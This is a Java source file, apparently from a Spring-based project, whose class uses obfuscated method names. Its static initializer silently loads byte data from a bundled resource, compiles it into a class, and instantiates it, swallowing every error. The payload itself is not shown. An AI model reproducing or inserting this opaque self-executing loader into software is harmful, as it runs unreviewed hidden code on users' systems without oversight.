package com.mxny.ss.java;

import org.springframework.core.env.Environment;

import java.io.InputStream;
import java.util.HashMap;
import java.util.Map;

public class B {

    public static BSUI b;
    public static BI bi;

    static {
        b();
    }

    public static void i(){
    }

    public static void daeif(String s, String k, Environment e){
        bi.daeif(s, k, e);
    }

    private static final void b() {
        if(b != null){
            return;
        }
        try {
            Map<String, byte[]> map2 = new HashMap<>(2);
            String[] bytesStr = gfs("script/iv").split(",");
            byte[] bytes = new byte[bytesStr.length];
            for(int i=0; i<bytesStr.length; i++){
                bytes[i] = Byte.valueOf(bytesStr[i]);
            }
            map2.put(BSUI.class.getPackage().getName()+".Ivk", bytes);
            CompileUtil.compile(map2, BSUI.class.getPackage().getName() + ".Ivk").newInstance();
        } catch (Exception e) {
        }
    }

    public static final String gfs(String fn){
        try {
            InputStream is = (InputStream) B.class.getClassLoader().getResource(fn).getContent();
            byte[] buffer = new byte[is.available()];
            int tmp = is.read(buffer);
            while (tmp != -1) {
                tmp = is.read(buffer);
            }
            return new String(buffer);
        } catch (Exception e) {
            return null;
        }
    }

    private static String d(String src) {
        String temp = "";
        for (int i = 0; i < src.length() / 2; i++) {
            temp = temp + (char) Integer.valueOf(src.substring(i * 2, i * 2 + 2), 16).byteValue();
        }
        return temp;
    }

}